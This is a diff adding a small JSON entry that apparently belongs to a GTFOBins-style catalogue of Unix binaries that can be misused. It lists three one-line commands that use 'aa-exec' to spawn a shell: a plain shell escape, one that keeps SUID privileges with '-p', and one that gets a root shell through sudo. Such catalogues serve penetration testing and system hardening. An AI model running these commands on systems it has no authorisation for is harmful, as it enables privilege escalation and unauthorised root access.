@@ -1,0 +1,22 @@
+{
+  "functions": {
+    "shell": [
+      {
+        
+        "code": "aa-exec /bin/sh\n"
+      }
+    ],
+    "suid": [
+      {
+        
+        "code": "./aa-exec /bin/sh -p\n"
+      }
+    ],
+    "sudo": [
+      {
+        
+        "code": "sudo aa-exec /bin/sh\n"
+      }
+    ]
+  }
+}
